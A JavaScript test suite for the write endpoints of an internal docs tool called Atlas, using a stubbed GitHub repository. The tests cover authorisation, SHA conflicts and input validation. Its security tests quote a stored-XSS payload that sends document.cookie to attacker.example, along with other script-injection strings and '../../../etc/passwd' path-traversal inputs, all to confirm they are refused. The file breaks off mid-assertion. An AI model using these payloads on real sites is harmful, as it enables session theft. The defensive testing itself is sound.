// The four endpoints, end to end, with no network anywhere: register answers, acceptance results,
// deployment stage transitions (M8), and — M9, decision 59 — approving a proposed design. Decision
// 35 used to hold this narrower on the strength of a separate operations console owning approvals
// and manifest edits; decision 57 found that console does not do those things, and decision 58
// retired 35 on that basis. `approve`'s own test group below (search "decision 59") uses its own
// tree-shaped stub, `githubTree()` — it moves several files in one commit rather than editing one,
// so the contents-API stub the first three groups share does not fit it; the tree CLIENT's own unit
// tests (blob/tree/commit/ref calls in isolation) live in `writeback-github.test.mjs` instead.
//
// Every request below goes through a stub standing in for GitHub, holding a tiny repository in
// memory: an installation-token endpoint, and the contents API with real SHAs that really change
// when a file is written. That is what makes the conflict test a conflict rather than an assertion
// about a mock.

import test from 'node:test';
import assert from 'node:assert/strict';
import { createHash, generateKeyPairSync } from 'node:crypto';

import { handleAcceptance, handleAnswer, handleDeploymentTransition } from '../api/lib/handlers.mjs';
import { renderMarkdown } from '../src/markdown.mjs';

const { privateKey } = generateKeyPairSync('rsa', {
  modulusLength: 2048,
  privateKeyEncoding: { type: 'pkcs1', format: 'pem' },
  publicKeyEncoding: { type: 'spki', format: 'pem' },
});

const ENV = {
  ATLAS_GITHUB_APP_ID: '123456',
  ATLAS_GITHUB_APP_INSTALLATION_ID: '78901234',
  ATLAS_GITHUB_APP_PRIVATE_KEY: privateKey,
  ATLAS_REPO: 'an-owner/a-repo',
};

const NOW = 1_760_000_000;

function principalHeader(roles, userDetails = 'someone@example.com') {
  return {
    'x-ms-client-principal': Buffer.from(
      JSON.stringify({ identityProvider: 'aad', userId: 'abc123', userDetails, userRoles: roles }),
      'utf8',
    ).toString('base64'),
  };
}

const AUTHOR = principalHeader(['anonymous', 'authenticated', 'reader', 'author']);
const READER = principalHeader(['anonymous', 'authenticated', 'reader']);

const REGISTER = [
  '# Open questions',
  '',
  '## Q1 · Does the cutover run per tenant or per environment?',
  '',
  'Raised while planning the second milestone.',
  '',
].join('\n');

const DEPLOYMENT_LOG_PATH = 'docs/features/a-stream/deployment-log.json';

const MANIFEST = JSON.stringify(
  {
    codename: 'A stream',
    deploymentLog: DEPLOYMENT_LOG_PATH,
    milestones: [
      { id: 'M1', acceptance: { kind: 'demo-script', record: 'docs/features/a-stream/m1-demo.md' } },
      { id: 'M2', acceptance: { kind: 'demo-script', record: null } },
    ],
  },
  null,
  2,
);

const DEMO = '# M1 demo script\n\n1. Start the thing.\n';

const DEPLOYMENT_LOG = JSON.stringify([{ stage: 'development' }], null, 2) + '\n';

// A repository in memory. What matters is that a write changes the SHA and that the API refuses a
// write carrying the old one — but the SHAs are real 40-character hex, because the stub's own
// spelling of a SHA once leaked out of here and into `payload.mjs`'s idea of what a SHA looks like.
// A stub that does not look like the thing it stands in for is how a contract gets written by a
// test.
function blobSha(path, version) {
  return createHash('sha1').update(`${path}@${version}`).digest('hex');
}

function gitHub(initial = {}) {
  const files = new Map(
    Object.entries(initial).map(([p, text]) => [p, { text, sha: blobSha(p, 0) }]),
  );
  let version = 0;
  const calls = [];

  const impl = async (url, init = {}) => {
    const method = init.method ?? 'GET';
    calls.push({ url, method, body: init.body });

    if (url.includes('/access_tokens')) {
      return reply(201, { token: 'ghs_installation', expires_at: 'later' });
    }

    const match = /\/repos\/([^/]+\/[^/]+)\/contents\/([^?]+)/.exec(url);
    if (!match) return reply(404, { message: 'Not Found' });
    const path = decodeURIComponent(match[2]).split('/').map(decodeURIComponent).join('/');

    if (method === 'GET') {
      const file = files.get(path);
      if (!file) return reply(404, { message: 'Not Found' });
      return reply(200, {
        type: 'file',
        encoding: 'base64',
        sha: file.sha,
        content: Buffer.from(file.text, 'utf8').toString('base64'),
      });
    }

    if (method === 'PUT') {
      const sent = JSON.parse(init.body);
      const file = files.get(path);
      if (file && sent.sha !== file.sha) {
        return reply(409, { message: `${path} is at ${file.sha} but expected ${sent.sha}` });
      }
      version += 1;
      const text = Buffer.from(sent.content, 'base64').toString('utf8');
      files.set(path, { text, sha: blobSha(path, version) });
      return reply(200, {
        commit: { html_url: `https://github.com/an-owner/a-repo/commit/c${version}`, sha: `c${version}` },
        content: { sha: blobSha(path, version) },
      });
    }

    return reply(405, { message: 'no' });
  };

  impl.files = files;
  impl.calls = calls;
  // Somebody else commits, from outside Atlas. This is how a stale SHA is produced honestly.
  impl.someoneElseCommits = (path, text) => {
    version += 1;
    files.set(path, { text, sha: blobSha(path, version) });
  };
  return impl;
}

function reply(status, json) {
  return {
    ok: status >= 200 && status < 300,
    status,
    json: async () => json,
    text: async () => JSON.stringify(json),
  };
}

function deps(fetchImpl, env = ENV) {
  return { env, fetchImpl, nowSeconds: NOW };
}

function post(headers, body) {
  return { method: 'POST', headers, body };
}

const REGISTER_PATH = 'docs/features/a-stream/open-questions.md';
const MANIFEST_PATH = 'docs/features/a-stream/workstream.json';
const DEMO_PATH = 'docs/features/a-stream/m1-demo.md';

function repo() {
  return gitHub({
    [REGISTER_PATH]: REGISTER,
    [MANIFEST_PATH]: MANIFEST,
    [DEMO_PATH]: DEMO,
    [DEPLOYMENT_LOG_PATH]: DEPLOYMENT_LOG,
  });
}

// M5: a workstream whose register is the new structured JSON form — same directory,
// `register.json` beside where `open-questions.md` would be, per `src/build.mjs`'s own
// `loadRegister` convention. No `open-questions.md` here at all, matching the real shape a
// migrated (or newly-scaffolded) workstream actually has.
const REGISTER_JSON_PATH = 'docs/features/a-stream/register.json';
const STRUCTURED_REGISTER = JSON.stringify(
  {
    slug: 'a-stream',
    title: 'A Stream Register',
    questions: [
      {
        id: 'Q1', question: 'Does the cutover run per tenant or per environment?', why: 'W',
        options: ['Per tenant', 'Per environment'], recommended: 'Per tenant', severity: 'BLOCKING',
        chosen: { kind: 'deferred', value: null }, citations: [],
      },
    ],
  },
  null,
  2,
) + '\n';

function repoWithStructuredRegister() {
  return gitHub({
    [REGISTER_JSON_PATH]: STRUCTURED_REGISTER,
    [MANIFEST_PATH]: MANIFEST,
    [DEMO_PATH]: DEMO,
    [DEPLOYMENT_LOG_PATH]: DEPLOYMENT_LOG,
  });
}

// --- the happy paths ---------------------------------------------------------------------------

test('answer: an authorised answer becomes a commit, and the endpoint returns it', async () => {
  const github = repo();
  const response = await handleAnswer(
    post(AUTHOR, { workstream: 'a-stream', question: 'Q1', answer: 'Per tenant.' }),
    deps(github),
  );

  assert.equal(response.status, 200);
  assert.equal(response.body.ok, true);
  assert.equal(response.body.path, REGISTER_PATH);
  assert.equal(response.body.commit, 'https://github.com/an-owner/a-repo/commit/c1');
  assert.match(github.files.get(REGISTER_PATH).text, /Per tenant\./);
  assert.match(github.files.get(REGISTER_PATH).text, /someone@example\.com/);
});

test('answer: the answer is the only thing written — Atlas keeps no state of its own', async () => {
  // Decision 37. The whole of what this request changed is one file in the repository, and the
  // only requests it made were to read it and to write it.
  const github = repo();
  await handleAnswer(post(AUTHOR, { workstream: 'a-stream', question: 'Q1', answer: 'Per tenant.' }), deps(github));

  // Amended for M8: `repo()` now also seeds a deployment log, so the fixture holds 4 files, not 3.
  assert.equal(github.files.size, 4, 'a file appeared that nobody asked for');
  const writes = github.calls.filter((call) => call.method === 'PUT');
  assert.equal(writes.length, 1);
  assert.ok(writes[0].url.includes('open-questions.md'), 'something other than the register was written');
});

// --- M5: the structured-register branch ---------------------------------------------------------

test('answer: a workstream with a structured register writes register.json, offered case', async () => {
  const github = repoWithStructuredRegister();
  const response = await handleAnswer(
    post(AUTHOR, { workstream: 'a-stream', question: 'Q1', answer: 'Per tenant', chosenWasOffered: true }),
    deps(github),
  );

  assert.equal(response.status, 200);
  assert.equal(response.body.ok, true);
  assert.equal(response.body.path, REGISTER_JSON_PATH);
  const written = JSON.parse(github.files.get(REGISTER_JSON_PATH).text);
  assert.deepEqual(written.questions[0].chosen, { kind: 'offered', value: 'Per tenant' });
  // open-questions.md was never even read, let alone written — the probe 404'd nothing here
  // because the file does not exist in this fixture at all.
  assert.equal(github.calls.filter((c) => c.url.includes('open-questions.md')).length, 0);
});

test('answer: a workstream with a structured register marks a write-in distinctly', async () => {
  const github = repoWithStructuredRegister();
  const response = await handleAnswer(
    post(AUTHOR, { workstream: 'a-stream', question: 'Q1', answer: 'Per venue, actually.', chosenWasOffered: false }),
    deps(github),
  );

  assert.equal(response.status, 200);
  const written = JSON.parse(github.files.get(REGISTER_JSON_PATH).text);
  assert.deepEqual(written.questions[0].chosen, { kind: 'written-in', value: 'Per venue, actually.' });
});

test('answer: chosenWasOffered defaults to false when omitted', async () => {
  const github = repoWithStructuredRegister();
  await handleAnswer(post(AUTHOR, { workstream: 'a-stream', question: 'Q1', answer: 'Something new.' }), deps(github));
  const written = JSON.parse(github.files.get(REGISTER_JSON_PATH).text);
  assert.equal(written.questions[0].chosen.kind, 'written-in');
});

test('answer: a workstream with NO register.json falls through to the prose path unchanged', async () => {
  // repo() (no register.json) is the pre-M5 fixture every existing prose test already uses — this
  // just asserts the probe read for register.json actually happens and 404s before falling
  // through, rather than assuming the existing passing tests prove it silently.
  const github = repo();
  const response = await handleAnswer(post(AUTHOR, { workstream: 'a-stream', question: 'Q1', answer: 'Per tenant.' }), deps(github));

  assert.equal(response.status, 200);
  assert.equal(response.body.path, REGISTER_PATH);
  const probed = github.calls.filter((c) => c.url.includes('register.json'));
  assert.equal(probed.length, 1, 'the structured-register probe never ran at all');
  assert.equal(probed[0].method, 'GET');
});

test('answer: an offered answer naming no real option is refused, structured path', async () => {
  const github = repoWithStructuredRegister();
  const response = await handleAnswer(
    post(AUTHOR, { workstream: 'a-stream', question: 'Q1', answer: 'Not a real option', chosenWasOffered: true }),
    deps(github),
  );
  assert.equal(response.status, 400);
  assert.equal(response.body.error, 'invalid-payload');
  assert.equal(github.calls.filter((c) => c.method === 'PUT').length, 0, 'a bad answer still got written');
});

test('answer: a conflict on the structured register is a real conflict, same as the prose path', async () => {
  const github = repoWithStructuredRegister();
  const first = await handleAnswer(
    post(AUTHOR, { workstream: 'a-stream', question: 'Q1', answer: 'Per tenant', chosenWasOffered: true }),
    deps(github),
  );
  assert.equal(first.status, 200);

  // Someone else commits between this caller's read and write, honestly: send the SAME (now
  // stale) sha the caller would have had from before the first answer.
  const staleResponse = await handleAnswer(
    post(AUTHOR, { workstream: 'a-stream', question: 'Q1', answer: 'Per environment', chosenWasOffered: true, sha: blobSha(REGISTER_JSON_PATH, 0) }),
    deps(github),
  );
  assert.equal(staleResponse.status, 409);
});

test('acceptance: the result goes into the record the MANIFEST names, not one a caller named', async () => {
  const github = repo();
  const response = await handleAcceptance(
    post(AUTHOR, { workstream: 'a-stream', milestone: 'M1', result: 'pass' }),
    deps(github),
  );

  assert.equal(response.status, 200);
  assert.equal(response.body.path, DEMO_PATH);
  assert.match(github.files.get(DEMO_PATH).text, /Acceptance: pass/);
  // The manifest was read to find the record and was not itself written to. Decision 35 gives
  // editing a manifest to the project's own operations console.
  assert.equal(github.files.get(MANIFEST_PATH).text, MANIFEST);
});

// --- authorisation -----------------------------------------------------------------------------

test('answer: an unauthorised caller is refused, and nothing reaches GitHub at all', async () => {
  const github = repo();
  const response = await handleAnswer(post({}, { workstream: 'a-stream', question: 'Q1', answer: 'x' }), deps(github));

  assert.equal(response.status, 401);
  assert.equal(response.body.error, 'unauthenticated');
  assert.equal(github.calls.length, 0, 'an unauthenticated request reached GitHub');
});

test('answer: a caller with `reader` but not `author` is refused, and told which role', async () => {
  const github = repo();
  const response = await handleAnswer(
    post(READER, { workstream: 'a-stream', question: 'Q1', answer: 'x' }),
    deps(github),
  );

  assert.equal(response.status, 403);
  assert.equal(response.body.error, 'forbidden');
  assert.match(response.body.message, /author/);
  assert.equal(github.calls.length, 0);
  assert.equal(github.files.get(REGISTER_PATH).text, REGISTER, 'the register was written to anyway');
});

test('acceptance: a `reader` is refused there too — the check is not on one endpoint only', async () => {
  const github = repo();
  const response = await handleAcceptance(
    post(READER, { workstream: 'a-stream', milestone: 'M1', result: 'pass' }),
    deps(github),
  );
  assert.equal(response.status, 403);
  assert.equal(github.calls.length, 0);
});

test('answer: authorisation is decided before the credential is even looked at', async () => {
  // Otherwise the empty-credential refusal would tell an unauthenticated caller how Atlas is
  // configured, and the 503 would mask the 401 for as long as the App does not exist.
  const response = await handleAnswer(post({}, { workstream: 'a-stream', question: 'Q1', answer: 'x' }), deps(repo(), {}));
  assert.equal(response.status, 401);
});

// --- the credential slot, which may be empty -----------------------------------------------------

test('answer: an empty credential refuses cleanly, and says the site still reads', async () => {
  const github = repo();
  const response = await handleAnswer(
    post(AUTHOR, { workstream: 'a-stream', question: 'Q1', answer: 'Per tenant.' }),
    deps(github, {}),
  );

  assert.equal(response.status, 503);
  assert.equal(response.body.error, 'credential-unavailable');
  assert.match(response.body.message, /ATLAS_GITHUB_APP_ID/);
  assert.ok(!/stack|at Object|\.mjs:/.test(response.body.message), 'a stack trace reached the caller');
  assert.equal(github.calls.length, 0, 'a request was made with no credential');
});

test('acceptance: an empty credential refuses the same way, not with a different failure', async () => {
  const response = await handleAcceptance(
    post(AUTHOR, { workstream: 'a-stream', milestone: 'M1', result: 'pass' }),
    deps(repo(), {}),
  );
  assert.equal(response.status, 503);
  assert.equal(response.body.error, 'credential-unavailable');
});

test('answer: a private key that is not a key is a refusal, never a stack trace', async () => {
  const response = await handleAnswer(
    post(AUTHOR, { workstream: 'a-stream', question: 'Q1', answer: 'x' }),
    deps(repo(), { ...ENV, ATLAS_GITHUB_APP_PRIVATE_KEY: 'not a key' }),
  );
  assert.equal(response.status, 503);
  assert.ok(!/\.mjs:\d+/.test(response.body.message), 'a stack trace reached the caller');
});

// --- the closed vocabulary ----------------------------------------------------------------------

test('acceptance: a result outside the closed vocabulary is rejected BY NAME', async () => {
  const github = repo();
  const response = await handleAcceptance(
    post(AUTHOR, { workstream: 'a-stream', milestone: 'M1', result: 'waived' }),
    deps(github),
  );

  assert.equal(response.status, 400);
  assert.equal(response.body.error, 'invalid-payload');
  assert.match(response.body.message, /"waived"/, 'the refusal does not quote the value it refused');
  assert.match(response.body.message, /pass/);
  assert.match(response.body.message, /fail/);
  assert.equal(github.calls.length, 0);
});

test('acceptance: a milestone STATUS is not an acceptance result, however plausible it looks', async () => {
  // `done` is in the manifest's own vocabulary, which is exactly why it is the value most likely
  // to be sent. Decision 35 keeps milestone status out of Atlas altogether.
  const response = await handleAcceptance(
    post(AUTHOR, { workstream: 'a-stream', milestone: 'M1', result: 'done' }),
    deps(repo()),
  );
  assert.equal(response.status, 400);
  assert.match(response.body.message, /"done"/);
});

test('answer: a field Atlas does not know is refused by name, rather than quietly ignored', async () => {
  for (const [field, body] of [
    ['repo', { workstream: 'a-stream', question: 'Q1', answer: 'x', repo: 'somebody/else' }],
    ['path', { workstream: 'a-stream', question: 'Q1', answer: 'x', path: 'docs/secrets.md' }],
    ['author', { workstream: 'a-stream', question: 'Q1', answer: 'x', author: 'not-me@example.com' }],
  ]) {
    const github = repo();
    const response = await handleAnswer(post(AUTHOR, body), deps(github));
    assert.equal(response.status, 400, `${field} was accepted`);
    assert.match(response.body.message, new RegExp(`"${field}"`));
    assert.equal(github.calls.length, 0);
  }
});

test('answer: a workstream shaped like a path is refused before a request is built', async () => {
  for (const workstream of ['../../../etc', 'a-stream/../../..', '.hidden', '']) {
    const github = repo();
    const response = await handleAnswer(
      post(AUTHOR, { workstream, question: 'Q1', answer: 'x' }),
      deps(github),
    );
    assert.equal(response.status, 400, `${JSON.stringify(workstream)} was accepted`);
    assert.equal(github.calls.length, 0);
  }
});

test('answer: an answer that would restructure the register is refused, naming why', async () => {
  const response = await handleAnswer(
    post(AUTHOR, { workstream: 'a-stream', question: 'Q1', answer: 'Yes.\n## Q2 · one I invented' }),
    deps(repo()),
  );
  assert.equal(response.status, 400);
  assert.match(response.body.message, /heading/i);
});

test('answer: a body that is not an object at all is refused, not read for fields', async () => {
  for (const body of [undefined, null, 'not json {', '[]', 42]) {
    const response = await handleAnswer(post(AUTHOR, body), deps(repo()));
    assert.equal(response.status, 400, `${JSON.stringify(body)} was accepted`);
  }
});

test('answer: only POST — nothing about this endpoint is safe to reach by other means', async () => {
  const response = await handleAnswer(
    { method: 'GET', headers: AUTHOR, body: { workstream: 'a-stream', question: 'Q1', answer: 'x' } },
    deps(repo()),
  );
  assert.equal(response.status, 405);
});

// --- what is not there --------------------------------------------------------------------------

test('answer: a question that is not in the register is a 404 naming the register', async () => {
  const response = await handleAnswer(
    post(AUTHOR, { workstream: 'a-stream', question: 'Q9', answer: 'x' }),
    deps(repo()),
  );
  assert.equal(response.status, 404);
  assert.match(response.body.message, /open-questions\.md/);
  assert.match(response.body.message, /Q9/);
});

test('answer: a workstream with no register is a 404 naming the path that is missing', async () => {
  const response = await handleAnswer(
    post(AUTHOR, { workstream: 'no-such-stream', question: 'Q1', answer: 'x' }),
    deps(repo()),
  );
  assert.equal(response.status, 404);
  assert.match(response.body.message, /docs\/features\/no-such-stream\/open-questions\.md/);
});

test('acceptance: a milestone that is not in the manifest is a 404 naming the manifest', async () => {
  const response = await handleAcceptance(
    post(AUTHOR, { workstream: 'a-stream', milestone: 'M7', result: 'pass' }),
    deps(repo()),
  );
  assert.equal(response.status, 404);
  assert.match(response.body.message, /workstream\.json/);
  assert.match(response.body.message, /M7/);
});

test('acceptance: a milestone whose manifest names no record says so, and writes nothing', async () => {
  const github = repo();
  const response = await handleAcceptance(
    post(AUTHOR, { workstream: 'a-stream', milestone: 'M2', result: 'pass' }),
    deps(github),
  );
  assert.equal(response.status, 409);
  assert.equal(response.body.error, 'no-acceptance-record');
  assert.match(response.body.message, /acceptance\.record/);
  assert.match(response.body.message, /workstream\.json/);
  assert.equal(github.calls.filter((c) => c.method === 'PUT').length, 0);
});

test('acceptance: a manifest that is not JSON is reported against its path, not swallowed', async () => {
  const github = gitHub({ [MANIFEST_PATH]: 'not json at all', [DEMO_PATH]: DEMO });
  const response = await handleAcceptance(
    post(AUTHOR, { workstream: 'a-stream', milestone: 'M1', result: 'pass' }),
    deps(github),
  );
  assert.ok(response.status >= 400);
  assert.match(response.body.message, /workstream\.json/);
});

test('acceptance: a manifest naming a record outside the repository is refused', async () => {
  // The manifest is a record like any other, and a record can be wrong. This is the last place
  // between it and a request URL.
  const manifest = JSON.stringify({
    milestones: [{ id: 'M1', acceptance: { kind: 'k', record: '../../../etc/passwd' } }],
  });
  const github = gitHub({ [MANIFEST_PATH]: manifest });
  const response = await handleAcceptance(
    post(AUTHOR, { workstream: 'a-stream', milestone: 'M1', result: 'pass' }),
    deps(github),
  );
  assert.ok(response.status >= 400);
  assert.equal(github.calls.filter((c) => c.method === 'PUT').length, 0);
});

// --- concurrency --------------------------------------------------------------------------------

test('answer: a stale SHA is a conflict — the other person\'s commit is not overwritten', async () => {
  const github = repo();

  // The caller's page was built from the register as it was.
  const staleSha = github.files.get(REGISTER_PATH).sha;

  // Somebody else answers first, from a desk, while this caller is still typing on a phone.
  github.someoneElseCommits(REGISTER_PATH, `${REGISTER}\nAnswered elsewhere.\n`);

  const response = await handleAnswer(
    post(AUTHOR, { workstream: 'a-stream', question: 'Q1', answer: 'Per tenant.', sha: staleSha }),
    deps(github),
  );

  assert.equal(response.status, 409);
  assert.equal(response.body.error, 'conflict');
  assert.match(github.files.get(REGISTER_PATH).text, /Answered elsewhere\./, 'the other commit was overwritten');
  assert.ok(!github.files.get(REGISTER_PATH).text.includes('Per tenant.'), 'the write went through anyway');
  assert.equal(github.calls.filter((c) => c.method === 'PUT').length, 0);
});

test('answer: a conflict arriving between the read and the write is a conflict too', async () => {
  // The narrower race, and the one the SHA on the PUT is actually for: the file changes after
  // Atlas has read it and before it writes.
  const github = repo();
  const inner = github;
  let read = false;
  const racing = async (url, init = {}) => {
    const response = await inner(url, init);
    if ((init.method ?? 'GET') === 'GET' && url.includes('open-questions.md') && !read) {
      read = true;
      inner.someoneElseCommits(REGISTER_PATH, `${REGISTER}\nAnswered elsewhere.\n`);
    }
    return response;
  };
  racing.files = inner.files;

  const response = await handleAnswer(
    post(AUTHOR, { workstream: 'a-stream', question: 'Q1', answer: 'Per tenant.' }),
    deps(racing),
  );

  assert.equal(response.status, 409);
  assert.equal(response.body.error, 'conflict');
  assert.match(racing.files.get(REGISTER_PATH).text, /Answered elsewhere\./);
});

test('answer: a matching SHA is not a conflict — the precondition only stops a stale one', async () => {
  const github = repo();
  const response = await handleAnswer(
    post(AUTHOR, {
      workstream: 'a-stream',
      question: 'Q1',
      answer: 'Per tenant.',
      sha: github.files.get(REGISTER_PATH).sha,
    }),
    deps(github),
  );
  assert.equal(response.status, 200);
});

test('acceptance: the SHA precondition is the acceptance record\'s, not the manifest\'s', async () => {
  const github = repo();
  const response = await handleAcceptance(
    post(AUTHOR, {
      workstream: 'a-stream',
      milestone: 'M1',
      result: 'pass',
      sha: github.files.get(DEMO_PATH).sha,
    }),
    deps(github),
  );
  assert.equal(response.status, 200);
});

// --- deployment transition (Task 5) -------------------------------------------------------------
//
// Same five-step shape as `handleAcceptance`, with `manifest.deploymentLog` in place of
// `milestone.acceptance.record` and no milestone lookup at all — a deployment transition is
// feature-level, not milestone-level.

test('deployment-transition: an authorised transition becomes a commit, and the endpoint returns it', async () => {
  const github = repo();
  const response = await handleDeploymentTransition(
    post(AUTHOR, { workstream: 'a-stream', stage: 'staging', note: 'smoke-tested' }),
    deps(github),
  );

  assert.equal(response.status, 200);
  assert.equal(response.body.ok, true);
  assert.equal(response.body.path, DEPLOYMENT_LOG_PATH);
  assert.equal(response.body.stage, 'staging');
  assert.equal(response.body.commit, 'https://github.com/an-owner/a-repo/commit/c1');
  const written = JSON.parse(github.files.get(DEPLOYMENT_LOG_PATH).text);
  assert.deepEqual(written, [{ stage: 'development' }, { stage: 'staging', note: 'smoke-tested' }]);
  // The manifest was read to find the log and was not itself written to — decision 35 keeps
  // manifest edits out of Atlas entirely.
  assert.equal(github.files.get(MANIFEST_PATH).text, MANIFEST);
});

test('deployment-transition: a workstream whose manifest names no deploymentLog is a 409, and writes nothing', async () => {
  const manifest = JSON.stringify({ codename: 'A stream', milestones: [] }, null, 2);
  const github = gitHub({ [MANIFEST_PATH]: manifest });

  const response = await handleDeploymentTransition(
    post(AUTHOR, { workstream: 'a-stream', stage: 'development' }),
    deps(github),
  );

  assert.equal(response.status, 409);
  assert.equal(response.body.error, 'no-deployment-log');
  assert.match(response.body.message, /deploymentLog/);
  assert.match(response.body.message, /workstream\.json/);
  assert.equal(github.calls.filter((c) => c.method === 'PUT').length, 0);
});

test('deployment-transition: a stale SHA is a conflict — the other transition is not overwritten', async () => {
  const github = repo();
  const staleSha = github.files.get(DEPLOYMENT_LOG_PATH).sha;

  github.someoneElseCommits(DEPLOYMENT_LOG_PATH, JSON.stringify([{ stage: 'development' }, { stage: 'release' }], null, 2) + '\n');

  const response = await handleDeploymentTransition(
    post(AUTHOR, { workstream: 'a-stream', stage: 'staging', sha: staleSha }),
    deps(github),
  );

  assert.equal(response.status, 409);
  assert.equal(response.body.error, 'conflict');
  const written = JSON.parse(github.files.get(DEPLOYMENT_LOG_PATH).text);
  assert.deepEqual(written, [{ stage: 'development' }, { stage: 'release' }], "the other commit was overwritten");
  assert.equal(github.calls.filter((c) => c.method === 'PUT').length, 0);
});

test('deployment-transition: a manifest naming a deploymentLog outside the repository is refused', async () => {
  const manifest = JSON.stringify({ milestones: [], deploymentLog: '../../../etc/passwd' });
  const github = gitHub({ [MANIFEST_PATH]: manifest });
  const response = await handleDeploymentTransition(
    post(AUTHOR, { workstream: 'a-stream', stage: 'development' }),
    deps(github),
  );
  assert.ok(response.status >= 400);
  assert.equal(response.body.error, 'unwritable-record');
  assert.equal(github.calls.filter((c) => c.method === 'PUT').length, 0);
});

test('deployment-transition: a manifest that is not JSON is reported against its path, not swallowed', async () => {
  const github = gitHub({ [MANIFEST_PATH]: 'not json at all' });
  const response = await handleDeploymentTransition(
    post(AUTHOR, { workstream: 'a-stream', stage: 'development' }),
    deps(github),
  );
  assert.ok(response.status >= 400);
  assert.match(response.body.message, /workstream\.json/);
});

test('deployment-transition: a `reader` is refused there too — the check is not on two endpoints only', async () => {
  const github = repo();
  const response = await handleDeploymentTransition(
    post(READER, { workstream: 'a-stream', stage: 'development' }),
    deps(github),
  );
  assert.equal(response.status, 403);
  assert.equal(github.calls.length, 0);
});

test('deployment-transition: an empty credential refuses the same way, not with a different failure', async () => {
  const response = await handleDeploymentTransition(
    post(AUTHOR, { workstream: 'a-stream', stage: 'development' }),
    deps(repo(), {}),
  );
  assert.equal(response.status, 503);
  assert.equal(response.body.error, 'credential-unavailable');
});

test('deployment-transition: a stage outside the closed vocabulary is rejected BY NAME', async () => {
  const github = repo();
  const response = await handleDeploymentTransition(
    post(AUTHOR, { workstream: 'a-stream', stage: 'shipping' }),
    deps(github),
  );
  assert.equal(response.status, 400);
  assert.equal(response.body.error, 'invalid-payload');
  assert.match(response.body.message, /"shipping"/);
  assert.equal(github.calls.length, 0);
});

test('deployment-transition: a malformed deployment log is a clean refusal, not a silent truncation', async () => {
  // The hardening from `api/lib/records.mjs`'s `appendDeploymentTransition`, exercised through the
  // real handler: a corrupted log is reported, not quietly replaced with a fresh one-entry array.
  const github = gitHub({ [MANIFEST_PATH]: MANIFEST, [DEPLOYMENT_LOG_PATH]: '{not json' });
  const response = await handleDeploymentTransition(
    post(AUTHOR, { workstream: 'a-stream', stage: 'development' }),
    deps(github),
  );
  assert.ok(response.status >= 400);
  assert.equal(response.body.error, 'unreadable-deployment-log');
  assert.equal(github.calls.filter((c) => c.method === 'PUT').length, 0);
});

// --- decision 35's boundary -----------------------------------------------------------------------

test('the Function exports exactly the named write handlers, and no stray one', async () => {
  // Not a fixed count (decision 58 retired that posture) — still a closed, named list: a stray
  // export starting with `handle` would be a write path nobody decided on and no route wires to.
  const module = await import('../api/lib/handlers.mjs');
  const handlers = Object.keys(module).filter((name) => name.startsWith('handle'));
  assert.deepEqual(handlers.sort(), [
    'handleAcceptance',
    'handleAnswer',
    'handleApprove',
    'handleDeploymentTransition',
    'handleRefresh',
  ]);
});

test('every request names the configured repository, and there is no way to make it name another', async () => {
  // The plan's "no write that can reach a repository other than the configured one". Until this
  // existed the stub answered any repository at all, so pointing the client somewhere else passed
  // the whole suite — found by making exactly that change and watching nothing go red.
  const github = repo();
  await handleAnswer(post(AUTHOR, { workstream: 'a-stream', question: 'Q1', answer: 'x' }), deps(github));
  await handleAcceptance(post(AUTHOR, { workstream: 'a-stream', milestone: 'M1', result: 'pass' }), deps(github));

  const contentCalls = github.calls.filter((call) => call.url.includes('/contents/'));
  assert.ok(contentCalls.length >= 3, `expected the record requests, saw ${contentCalls.length}`);
  for (const call of contentCalls) {
    assert.match(
      call.url,
      /\/repos\/an-owner\/a-repo\/contents\//,
      `a request named a repository nobody configured: ${call.url}`,
    );
  }
});

test('decision 35: no request path can write to a manifest, a roadmap or a config', async () => {
  const github = repo();
  await handleAnswer(post(AUTHOR, { workstream: 'a-stream', question: 'Q1', answer: 'x' }), deps(github));
  await handleAcceptance(post(AUTHOR, { workstream: 'a-stream', milestone: 'M1', result: 'pass' }), deps(github));

  const written = github.calls.filter((c) => c.method === 'PUT').map((c) => c.url);
  assert.equal(written.length, 2);
  for (const url of written) {
    assert.ok(!url.includes('workstream.json'), 'a manifest was written');
    assert.ok(!url.includes('ROADMAP'), 'the roadmap was written');
    assert.ok(!url.includes('atlas.config.json'), "the project's config was written");
  }
});

// --- C1: the endpoint is the boundary between an invitation and the corpus ------------------------

// Verbatim from the security review, which posted exactly this through the real handler with a
// valid `author` principal and got it back out of the built site.
const XSS =
  '<img src=x onerror="alert(1)"><script>fetch("https://attacker.example/"+document.cookie)</script>';

test('answer: the stored-XSS payload is refused, and nothing is committed', async () => {
  const github = repo();
  const response = await handleAnswer(
    post(AUTHOR, { workstream: 'a-stream', question: 'Q1', answer: XSS }),
    deps(github),
  );

  assert.equal(response.status, 400);
  assert.equal(response.body.error, 'invalid-payload');
  assert.match(response.body.message, /HTML/i);
  assert.equal(github.calls.filter((c) => c.method === 'PUT').length, 0);
  assert.equal(github.files.get(REGISTER_PATH).text, REGISTER, 'the register was written to anyway');
});

test('acceptance: the same payload is refused in a note — both bodies, not just the answer', async () => {
  const github = repo();
  const response = await handleAcceptance(
    post(AUTHOR, { workstream: 'a-stream', milestone: 'M1', result: 'fail', note: XSS }),
    deps(github),
  );

  assert.equal(response.status, 400);
  assert.match(response.body.message, /HTML/i);
  assert.equal(github.calls.filter((c) => c.method === 'PUT').length, 0);
});

test('answer: whatever an author CAN write renders with no markup of their making in it', async () => {
  // The property rather than one payload: run a spread of hostile bodies through the real
  // endpoint, take whatever actually landed in the register, render it the way the site renders
  // it, and look for markup that was not already in the record.
  const attempts = [
    XSS,
    '<svg/onload=alert(1)>',
    '</p><script>alert(1)</script>',
    'javascript:alert(1)',
    '[click me](javascript:alert(1))',
    '[click me](vbscript:alert(1))',
    '![x](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)',
    'Injected Heading\n================',
    'Injected\n---',
    '&lt;script&gt;alert(1)&lt;/script&gt;',
    'plain prose, 3 < 4, and a [link](https://example.com)',
  ];

  const before = renderMarkdown(REGISTER, { hrefBase: '' });
  const headingsBefore = (before.match(/<h[1-6]/gi) ?? []).length;

  for (const answer of attempts) {
    const github = repo();
    await handleAnswer(post(AUTHOR, { workstream: 'a-stream', question: 'Q1', answer }), deps(github));
    const html = renderMarkdown(github.files.get(REGISTER_PATH).text, { hrefBase: '' });

    assert.ok(!/<script/i.test(html), `${JSON.stringify(answer)} put a script tag on the page`);
    assert.ok(
      !/\son(error|load|click|focus|mouseover)\s*=/i.test(html),
      `${JSON.stringify(answer)} put an event handler on the page`,
    );
    assert.ok(
